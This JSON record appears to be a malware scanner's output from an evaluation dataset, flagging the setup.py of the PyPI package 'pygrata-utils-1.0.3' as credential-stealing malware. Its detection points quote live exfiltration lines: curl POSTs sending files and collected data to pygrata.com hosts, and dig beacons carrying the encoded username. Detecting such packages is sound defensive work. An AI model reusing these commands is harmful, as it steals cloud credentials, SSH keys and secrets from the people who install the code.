{
  "package_name": "pygrata-utils-1.0.3",
  "total_matches": 13,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
      "file_name": "setup.py",
      "detection_count": 13,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code exhibits clear malicious behavior. It collects sensitive information from the host system, including AWS IAM credentials (via the EC2 metadata service), AWS CLI credentials, environment variables (including .env files), SSH keys and files, and system details (hostname, username, IP address, current working directory). It then exfiltrates this data to remote servers (graph.pygrata.com and graphs.pygrata.com) using HTTP POST requests via curl. The code also attempts to signal or track execution by sending DNS queries to a domain derived from the username. The use of subprocess.getoutput to execute shell commands for data collection and exfiltration, combined with the targeting of sensitive files and metadata, is consistent with credential theft and data exfiltration malware.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "35",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "result = subprocess.getoutput(acmd)",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:35",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        },
        {
          "line_number": "38",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "getcred = subprocess.getoutput(accmd)",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:38",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        },
        {
          "line_number": "43",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "result2 = subprocess.getoutput(bcmd)",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:43",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        },
        {
          "line_number": "65",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "ipadd = subprocess.getoutput(ipcmd)",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:65",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        },
        {
          "line_number": "73",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "result3 = subprocess.getoutput(ccmd)",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:73",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        },
        {
          "line_number": "78",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "result4 = subprocess.getoutput(cdcmd)",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:78",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        },
        {
          "line_number": "85",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "output = subprocess.getoutput(catenvcmd)",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:85",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        },
        {
          "line_number": "91",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "subprocess.getoutput(\"curl -X POST http://graph.pygrata.com:8000/upload -F 'files=@\" + filename2 + \"' -F 'token=PyGr@ta'\")",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:91",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        },
        {
          "line_number": "92",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + allen + '\"')",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:92",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        },
        {
          "line_number": "98",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:98",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        },
        {
          "line_number": "104",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "subprocess.getoutput(\"curl -X POST http://graph.pygrata.com:8000/upload -F 'files=@\" + filename2 + \"' -F 'token=PyGr@ta'\")",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:104",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        },
        {
          "line_number": "105",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + all8 + '\"')",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:105",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        },
        {
          "line_number": "111",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')",
          "full_match": "* This package is executing OS commands in the setup.py file at pygrata-utils-1.0.3/setup.py:111",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pygrata-utils-1.0.3/pygrata-utils-1.0.3/setup.py",
          "relative_path": "pygrata-utils-1.0.3/setup.py"
        }
      ]
    }
  ]
}